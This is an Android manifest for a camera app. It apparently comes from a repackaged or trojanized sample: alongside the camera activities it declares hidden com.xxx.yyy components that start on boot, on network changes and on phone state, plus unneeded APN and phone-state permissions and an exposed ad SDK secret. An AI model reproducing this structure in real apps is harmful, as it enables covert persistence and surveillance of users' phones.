<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.znzn.apps.camerashow">
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:clearTaskOnLaunch="true" android:configChanges="keyboardHidden|orientation" android:name=".activity.ACamera" android:screenOrientation="landscape" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen">
            <intent-filter>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name=".activity.AFileBrowser">
            <intent-filter>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name=".activity.ASwitcher">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name=".activity.AMake">
            <intent-filter>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:name=".activity.AEdit">
            <intent-filter>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|navigation|orientation" android:name=".activity.APicEdit">
            <intent-filter>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <meta-data android:name="UmAd_APP_SEC" android:value="612f4596b2f529c3"/>
        <meta-data android:name="UmAd_APP_ID" android:value="5d91d78946f81b00"/>
        <receiver android:name="com.xxx.yyy.MyBoolService">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.xxx.yyy.MyAlarmReceiver">
            <intent-filter>
                <action android:name="com.lz.myservicestart"/>
            </intent-filter>
        </receiver>
        <service android:enabled="true" android:name="com.xxx.yyy.MyService"/>
        <receiver android:name="com.xxx.yyy.NetWorkReceiver">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.xxx.yyy.CustomBroadcastReceiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
            </intent-filter>
        </receiver>
    </application>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
</manifest>